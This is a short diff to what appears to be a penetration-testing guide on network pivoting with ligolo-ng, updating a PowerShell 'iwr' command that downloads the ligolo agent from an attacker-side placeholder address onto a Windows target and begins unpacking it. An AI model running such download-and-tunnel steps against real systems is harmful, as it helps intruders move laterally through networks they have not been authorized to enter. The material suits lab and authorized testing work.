@@ -185,7 +185,7 @@ Then launch the proxy binary on Kali like so (any port will do but `443` is less
 ```
 Download the agent binary to the target machine and run it, if we assume its Windows:
 ```powershell
-iwr -uri http://192.168.45.xx/ligolo-ng_agent_0.4.4_windows_amd64.zip -Outfile ligolo-agent.zip
+iwr -uri http://192.168.x.y/ligolo/ligolo-ng_agent_0.7.5_windows_amd64.zip -Outfile ligolo-agent.zip
 ```
 ```powershell
 Expand-Archive ligolo-agent.zip
